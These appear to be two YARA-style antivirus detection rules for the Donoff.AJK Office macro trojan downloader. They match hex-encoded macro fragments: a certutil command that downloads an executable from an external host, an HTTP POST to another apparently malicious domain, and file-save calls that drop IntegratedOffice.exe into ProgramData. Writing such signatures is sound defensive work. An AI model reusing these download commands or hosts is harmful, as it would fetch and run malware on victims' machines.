
rule TrojanDownloader_O97M_Donoff_AJK_MSR{
	meta:
		description = "TrojanDownloader:O97M/Donoff.AJK!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_00_0 = {63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 20 2b 20 43 68 72 28 33 34 29 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 74 70 22 20 2b 20 22 3a 2f 22 20 2b 20 22 2f 64 65 66 2e 6e 69 6d 65 2e 78 79 7a 3a 32 30 39 35 2f 73 6c 69 6e 67 2f 72 77 63 6f 72 65 2e 65 78 65 22 20 2b 20 43 68 72 28 33 34 29 20 2b 20 22 20 25 74 6d 70 25 2f 74 2e 65 78 65 } //00 00  certutil.exe -urlcache -split -f " + Chr(34) + "h" + "t" + "tp" + ":/" + "/def.nime.xyz:2095/sling/rwcore.exe" + Chr(34) + " %tmp%/t.exe
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_AJK_MSR_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff.AJK!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_00_0 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 50 4f 53 54 22 2c 20 22 68 74 74 70 3a 2f 2f 6c 69 6e 64 61 2d 63 61 6c 6c 61 67 68 61 6e 2e 69 63 75 2f 4d 69 6e 6b 6f 77 73 6b 69 2f 62 72 6f 77 6e } //01 00  xHttp.Open "POST", "http://linda-callaghan.icu/Minkowski/brown
		$a_00_1 = {6f 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 49 6e 74 65 67 72 61 74 65 64 4f 66 66 69 63 65 2e 74 78 74 } //01 00  oStream.SaveToFile "C:\ProgramData\IntegratedOffice.txt
		$a_00_2 = {42 69 6e 61 72 79 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 49 6e 74 65 67 72 61 74 65 64 4f 66 66 69 63 65 2e 65 78 65 } //00 00  BinaryStream.SaveToFile ("C:\ProgramData\IntegratedOffice.exe
	condition:
		any of ($a_*)
 
}